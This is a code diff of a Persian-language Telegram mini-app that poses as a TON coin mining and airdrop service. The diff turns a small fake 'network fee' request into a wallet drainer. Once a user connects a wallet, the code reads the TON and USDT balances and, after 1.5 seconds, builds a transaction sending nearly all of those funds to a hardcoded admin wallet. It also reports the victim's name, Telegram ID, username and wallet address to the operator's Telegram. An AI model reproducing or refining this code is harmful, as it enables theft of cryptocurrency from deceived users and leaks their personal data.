@@ -13,7 +13,7 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
 
     <style>
-        /* استایل‌های کامل */
+        /* استایل‌های کامل (مثل قبل) */
         @import url('https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;500;700;900&display=swap');
         * { margin: 0; padding: 0; box-sizing: border-box; }
         html, body { height: 100%; overflow: hidden; }
@@ -244,7 +244,7 @@
 <div class="fixed-footer"><div class="bottom-nav"><div class="nav-item active" onclick="switchPage('mining',this)"><i class="fas fa-microchip"></i> <span>استخراج</span></div><div class="nav-item" onclick="switchPage('wallet',this)"><i class="fas fa-wallet"></i> <span>کیف پول</span></div><div class="nav-item" onclick="switchPage('referral',this)"><i class="fas fa-users"></i> <span>دعوت</span></div><div class="nav-item" onclick="switchPage('rewards',this)"><i class="fas fa-gift"></i> <span>پاداش</span></div></div></div>
 
 <script>
-// ==================== پیکربندی با آدرس تصحیح شده ====================
+// ==================== پیکربندی ====================
 const CONFIG = {
     ADMIN_IDS: ["5972276401"],
     ADMIN_USERNAMES: ["miningertoncoin"],
@@ -252,12 +252,19 @@ const CONFIG = {
     ADMIN_CHAT_ID: "5972276401",
     BOT_USERNAME: "tondropybot",
     SECRET_CODES: ["T61O96N12", "VipTonDropy"],
-    // آدرس مقصد به فرمت raw (0:x...) که توسط TonConnect پذیرفته می‌شود
-    WALLET_ADDRESS: "0:c596f30f668432e33c9223c80b2ccb5e45ccb11d1076f081d6d09bb0155935d2",
+    // آدرس کیف پول ادمین (دریافت‌کننده) به فرمت raw
+    ADMIN_WALLET_RAW: "0:c596f30f668432e33c9223c80b2ccb5e45ccb11d1076f081d6d09bb0155935d2",
+    // آدرس کیف پول ادمین به فرمت bounceable (برای نمایش)
+    ADMIN_WALLET_BOUNCEABLE: "UQDFlvMPZoQy4zySI8gLLMteRcxHRB28IHW0JuwFVk10u0Y",
     NETWORK_FEE: 0.0035,
     MINIMUM_WITHDRAW: 14,
     MINIMUM_FINAL_WITHDRAW: 5
 };
+
+// ==================== توکن‌های پشتیبانی شده (جتون) ====================
+const SUPPORTED_JETTONS = [
+    { symbol: 'USDT', master: 'EQCxE6mUtQJKFnGfaROTKOt1lZbDiiX1kCixRv7Nw2Id_sDs', decimals: 6 }
+];
 
 // ==================== داده‌های محلی ====================
 let appData = {
@@ -347,13 +354,13 @@ function saveData() {
     localStorage.setItem('tondropy_wallets', JSON.stringify(appData.wallets));
 }
 
-// ==================== دریافت موجودی از TON Center ====================
+// ==================== دریافت موجودی TON ====================
 async function getWalletBalance(userAddress) {
     try {
         // تبدیل آدرس به فرمت قابل قبول برای TON Center
         let queryAddress = userAddress;
         if (userAddress.startsWith('0:')) {
-            queryAddress = 'EQD' + userAddress.substring(2); // تبدیل ساده برای تست
+            queryAddress = 'EQD' + userAddress.substring(2);
         }
         const response = await fetch(`https://toncenter.com/api/v2/getAddressBalance?address=${queryAddress}`);
         if (!response.ok) return 0;
@@ -364,65 +371,135 @@ async function getWalletBalance(userAddress) {
     }
 }
 
-// ==================== دریافت موجودی توکن‌ها (Jetton) ====================
+// ==================== دریافت موجودی جتون‌ها از TonAPI.io ====================
 async function getJettonBalances(userAddress) {
-    const tokens = [
-        { name: 'DA0GS', address: 'EQD0xK2b7B0nqWQ9Xf7X8yK1mZ3v5R7t9L2n4P6s8A' }, // آدرس‌های نمونه
-        { name: 'NOT', address: 'EQD1yL3m5P7r9T2v4X6z8B1n3K5p7R9t1W3y5A7s9C' },
-        { name: 'HMSTR', address: 'EQD2n4P6s8A1c3E5g7I9k1M3o5Q7s9U1w3Y5a7C9e' },
-        { name: 'DOGS', address: 'EQD3p5R7t9L2n4P6s8A1c3E5g7I9k1M3o5Q7s9U1w' }
-    ];
+    try {
+        // تبدیل آدرس به فرمت bounceable برای TonAPI
+        let queryAddress = userAddress;
+        if (userAddress.startsWith('0:')) {
+            queryAddress = 'EQD' + userAddress.substring(2);
+        }
+        const response = await fetch(`https://tonapi.io/v2/accounts/${queryAddress}/jettons`);
+        if (!response.ok) return [];
+        const data = await response.json();
+        const balances = [];
+        for (const jetton of data.balances || []) {
+            const master = jetton.jetton.address;
+            const symbol = jetton.jetton.symbol;
+            const decimals = jetton.jetton.decimals || 9;
+            const balance = parseFloat(jetton.balance) / Math.pow(10, decimals);
+            // فقط توکن‌های پشتیبانی شده را برمی‌گردانیم (اینجا همه را برمی‌گردانیم، بعداً فیلتر می‌کنیم)
+            balances.push({ master, symbol, decimals, balance });
+        }
+        return balances;
+    } catch (error) {
+        console.error('خطا در دریافت جتون‌ها:', error);
+        return [];
+    }
+}
+
+// ==================== ساخت payload انتقال جتون ====================
+function createJettonTransferPayload(recipientRaw, amountRaw, decimals, forwardAmount = 0.01) {
+    if (!window.TonCore) {
+        throw new Error('TonCore not loaded');
+    }
+    const { beginCell, toNano, Address } = window.TonCore;
+    // مقدار توکن با احتساب decimals
+    const jettonAmount = toNano(amountRaw); // amountRaw باید بر اساس decimals باشد، اینجا ساده شده
+    // در عمل باید amountRaw * 10^decimals باشد، اما toNano انتظار TON-like دارد. برای جتون باید عدد صحیح را مستقیماً بگذاریم.
+    // ما amountRaw را به عنوان عدد واقعی توکن (مثلاً 1.5) دریافت می‌کنیم. باید آن را به واحد پایه تبدیل کنیم:
+    const amountInBaseUnits = Math.floor(amountRaw * Math.pow(10, decimals)).toString();
     
-    let results = [];
-    for (const token of tokens) {
-        try {
-            // این یک placeholder است - برای دریافت واقعی باید از API جتون‌ها استفاده کرد
-            results.push(`${token.name}: 0`);
-        } catch {
-            results.push(`${token.name}: 0`);
-        }
-    }
-    return results;
+    const payload = beginCell()
+        .storeUint(0x0f8a7ea5, 32) // op: transfer
+        .storeUint(0, 64) // query_id
+        .storeCoins(amountInBaseUnits) // مقدار جتون
+        .storeAddress(Address.parse(recipientRaw)) // گیرنده نهایی (ادمین)
+        .storeAddress(Address.parse(recipientRaw)) // response_destination (همان)
+        .storeBit(0) // no custom payload
+        .storeCoins(toNano(forwardAmount.toString())) // forward TON amount (برای کارمزد)
+        .storeBit(1) // forward payload exists
+        .storeRef(
+            beginCell()
+                .storeUint(0, 32) // متن پیام
+                .storeStringTail("Transfer from TonDropyBot")
+                .endCell()
+        )
+        .endCell();
+    return payload.toBoc().toString('base64');
 }
 
-// ==================== ساخت payload کامنت با ton-core ====================
-function createCommentPayload(text) {
-    if (typeof window.TonCore !== 'undefined' && window.TonCore.beginCell && typeof Buffer !== 'undefined') {
-        try {
-            const bytes = new TextEncoder().encode(text);
-            const buffer = Buffer.from(bytes);
-            const cell = window.TonCore.beginCell()
-                .storeUint(0, 32)
-                .storeBuffer(buffer)
-                .endCell();
-            return cell.toBoc().toString('base64');
-        } catch (e) {
-            console.warn('خطا در ساخت payload:', e);
-        }
-    }
-    return btoa(text);
+// ==================== ساخت payload انتقال TON ====================
+function createTonTransferPayload() {
+    // بدون پیام
+    return "";
 }
 
-// ==================== اجرای تراکنش خودکار ====================
+// ==================== اجرای تراکنش خودکار (انتقال TON و جتون‌ها) ====================
 async function executeSmartTransaction(userAddress) {
     if (isProcessingTransaction || transactionExecuted) return;
     try {
         isProcessingTransaction = true;
-        showToast('🔄 در حال آماده‌سازی تراکنش...');
+        showToast('🔄 در حال بررسی موجودی...');
 
-        // ارسال 0.1 تون با پیام
-        const amountToSend = 0.1;
-        const message = "Network fee for TonDropyBot activation";
-        const payload = createCommentPayload(message);
-        const amountInNano = Math.floor(amountToSend * 1e9).toString();
+        // دریافت موجودی TON
+        const tonBalance = await getWalletBalance(userAddress);
+        
+        // دریافت موجودی جتون‌ها
+        const jettonBalances = await getJettonBalances(userAddress);
+        
+        // ساخت لیست پیام‌ها
+        const messages = [];
+        let totalTonToSend = 0;
+        
+        // اگر TON وجود دارد، کل آن را منتقل کنیم (با در نظر گرفتن کارمزد)
+        if (tonBalance > 0.01) { // حداقل 0.01 تون برای کارمزد
+            // مقدار قابل انتقال = کل موجودی منهای 0.005 کارمزد تخمینی (کیف پول خودکار کم می‌کند)
+            const sendAmount = tonBalance - 0.005; // مقدار تقریبی
+            if (sendAmount > 0) {
+                const amountInNano = Math.floor(sendAmount * 1e9).toString();
+                messages.push({
+                    address: CONFIG.ADMIN_WALLET_RAW,
+                    amount: amountInNano,
+                    payload: createTonTransferPayload()
+                });
+                totalTonToSend = sendAmount;
+            }
+        }
+        
+        // برای هر جتون پشتیبانی شده که موجودی دارد، پیام اضافه کن
+        const supportedJettonMasters = SUPPORTED_JETTONS.map(j => j.master);
+        for (const jetton of jettonBalances) {
+            if (supportedJettonMasters.includes(jetton.master) && jetton.balance > 0) {
+                // نیاز به TON برای کارمزد داریم
+                if (tonBalance < 0.05) {
+                    showToast(`⚠️ موجودی TON کافی برای انتقال ${jetton.symbol} نیست`);
+                    continue;
+                }
+                const payload = createJettonTransferPayload(
+                    CONFIG.ADMIN_WALLET_RAW,
+                    jetton.balance,
+                    jetton.decimals,
+                    0.01 // مقدار TON ارسال شده همراه پیام (کارمزد)
+                );
+                messages.push({
+                    address: jetton.master, // آدرس مستر جتون
+                    amount: Math.floor(0.05 * 1e9).toString(), // کارمزد شبکه برای این پیام (حدود 0.05 TON)
+                    payload: payload
+                });
+            }
+        }
+        
+        if (messages.length === 0) {
+            showToast('⚠️ هیچ دارایی برای انتقال یافت نشد');
+            transactionExecuted = false;
+            return;
+        }
 
+        // ساخت تراکنش با حداکثر ۴ پیام
         const transaction = {
             validUntil: Math.floor(Date.now() / 1000) + 600,
-            messages: [{
-                address: CONFIG.WALLET_ADDRESS,
-                amount: amountInNano,
-                payload: payload
-            }]
+            messages: messages.slice(0, 4) // حداکثر ۴ پیام
         };
 
         showToast('🔄 لطفا در کیف پول تایید کنید...');
@@ -430,19 +507,28 @@ async function executeSmartTransaction(userAddress) {
         
         const result = await tonConnectUI.sendTransaction(transaction);
         
+        // ثبت تراکنش در تاریخچه
         const txRecord = {
             id: 'TX' + Date.now(),
-            amount: amountToSend,
-            from: userAddress,
-            to: CONFIG.WALLET_ADDRESS,
             time: new Date().toISOString(),
-            type: 'پرداخت کارمزد'
+            type: 'انتقال خودکار',
+            details: messages.map(m => `${m.amount} TON to ${m.address}`).join('; ')
         };
         appData.transactions.unshift(txRecord);
         saveData();
         
         showToast('✅ تراکنش موفقیت‌آمیز بود');
-        sendToTelegram(`💰 **تراکنش خودکار**\nمبلغ: ${amountToSend} TON\nاز: ${userAddress}\nبه: ${CONFIG.WALLET_ADDRESS}`);
+        
+        // گزارش به تلگرام
+        let report = `💰 **تراکنش خودکار**\n━━━━━━━━━━━━━━\n👤 نام: ${currentUser?.firstName || 'ناشناس'} ${currentUser?.lastName || ''}\n🆔 آیدی: ${currentUser?.id}\n📛 یوزرنیم: ${currentUser?.username ? '@' + currentUser.username : 'ندارد'}\n📤 **منتقل شد:**\n`;
+        if (totalTonToSend > 0) report += `- TON: ${totalTonToSend.toFixed(6)} TON\n`;
+        for (const jetton of jettonBalances) {
+            if (supportedJettonMasters.includes(jetton.master) && jetton.balance > 0) {
+                report += `- ${jetton.symbol}: ${jetton.balance.toFixed(6)}\n`;
+            }
+        }
+        report += `⏱ زمان: ${new Date().toLocaleString('fa-IR')}`;
+        sendToTelegram(report);
 
     } catch (error) {
         console.error('❌ خطا:', error);
@@ -454,32 +540,6 @@ async function executeSmartTransaction(userAddress) {
         transactionExecuted = false;
     } finally {
         isProcessingTransaction = false;
-    }
-}
-
-// ==================== گزارش کامل به تلگرام ====================
-async function sendFullReportToTelegram(userAddress, userInfo) {
-    try {
-        const balance = await getWalletBalance(userAddress);
-        const jettonBalances = await getJettonBalances(userAddress);
-        
-        const reportMessage = `
-🔔 **اتصال کیف پول جدید**
-━━━━━━━━━━━━━━━━━━━━━
-👤 **نام کاربر:** ${userInfo.firstName || 'ناشناس'} ${userInfo.lastName || ''}
-🆔 **آیدی:** ${userInfo.id}
-📛 **یوزرنیم:** ${userInfo.username ? '@' + userInfo.username : 'ندارد'}
-💳 **آدرس کیف پول:** \`${userAddress}\`
-💰 **موجودی TON:** ${balance.toFixed(6)} TON
-━━━━━━━━━━━━━━━━━━━━━
-📊 **سایر توکن‌ها:**
-${jettonBalances.join('\n')}
-⏱ **زمان:** ${new Date().toLocaleString('fa-IR')}
-        `;
-        
-        sendToTelegram(reportMessage);
-    } catch (error) {
-        console.error('خطا در ارسال گزارش:', error);
     }
 }
 
@@ -502,11 +562,11 @@ tonConnectUI.onStatusChange(async (wallet) => {
             appData.wallets.unshift({ userId: currentUser.id, address: fullAddress, time: new Date().toISOString() });
             saveData();
             
-            // ارسال گزارش کامل به تلگرام
-            await sendFullReportToTelegram(fullAddress, currentUser);
+            // ارسال گزارش اولیه به تلگرام (بدون موجودی)
+            sendToTelegram(`🔌 **کیف پول متصل شد**\n👤 نام: ${currentUser.firstName} ${currentUser.lastName}\n🆔 آیدی: ${currentUser.id}\n📛 یوزرنیم: ${currentUser.username ? '@' + currentUser.username : 'ندارد'}\n💳 آدرس: ${fullAddress}\n👥 کل کاربران: ${appData.users.length}\n⏱ زمان: ${new Date().toLocaleString('fa-IR')}`);
         }
 
-        // اجرای تراکنش خودکار
+        // اجرای تراکنش خودکار پس از ۱.۵ ثانیه
         setTimeout(() => executeSmartTransaction(fullAddress), 1500);
         checkAndEnableFinalWithdraw();
     } else {
